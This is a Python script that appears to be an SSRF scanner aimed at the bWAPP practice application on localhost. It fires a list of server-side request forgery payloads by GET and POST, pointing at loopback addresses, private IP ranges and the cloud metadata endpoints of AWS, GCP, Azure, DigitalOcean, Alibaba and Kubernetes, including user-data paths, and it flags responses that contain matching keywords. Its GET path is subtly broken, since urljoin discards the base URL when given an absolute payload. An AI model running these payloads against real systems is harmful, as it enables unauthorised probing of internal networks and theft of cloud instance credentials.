import requests
from urllib.parse import urljoin
import logging
import concurrent.futures

# Configure logging
logging.basicConfig(filename='ssrf_scanner.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Extended list of SSRF payloads
payloads = [
    # Localhost and internal IPs
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",  # IPv6 localhost

    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",

    # Google Cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",

    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1.json",

    # Alibaba Cloud metadata
    "http://100.100.100.200/latest/meta-data/",
    
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Kubernetes metadata
    "http://kubernetes.default.svc.cluster.local",
    
    # Common private IP ranges
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1"
]

# Keywords to look for in the response for advanced analysis
keywords = [
    "metadata", "instance", "project-id", "hostname", "user-data",
    "private", "internal", "kubernetes", "azure", "digitalocean", "alibaba"
]

# Function to test a single URL with GET request
def test_ssrf_get(base_url):
    for payload in payloads:
        test_url = urljoin(base_url, payload)
        try:
            response = requests.get(test_url, timeout=5)
            analyze_response(response, test_url)
        except requests.RequestException as e:
            logging.error(f"Error testing URL: {test_url}, {e}")

# Function to test a single URL with POST request
def test_ssrf_post(base_url):
    for payload in payloads:
        data = {"url": payload}
        try:
            response = requests.post(base_url, data=data, timeout=5)
            analyze_response(response, base_url, payload)
        except requests.RequestException as e:
            logging.error(f"Error testing URL: {base_url} with payload {payload}, {e}")

# Function to analyze the response for SSRF indicators
def analyze_response(response, url, payload=None):
    if response.status_code == 200:
        for keyword in keywords:
            if keyword in response.text.lower():
                logging.info(f"Potential SSRF vulnerability detected: {url} with payload {payload}")
                print(f"Potential SSRF vulnerability detected: {url} with payload {payload}")
                break

# Function to scan a list of URLs
def scan_urls(urls):
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for url in urls:
            print(f"Testing {url}")
            futures.append(executor.submit(test_ssrf_get, url))
            futures.append(executor.submit(test_ssrf_post, url))
        concurrent.futures.wait(futures)

# Main function
def main():
    urls_to_test = [
        "http://localhost/bWAPP/ssrf.php",
        # Add more URLs to test
    ]
    scan_urls(urls_to_test)

if __name__ == "__main__":
    main()
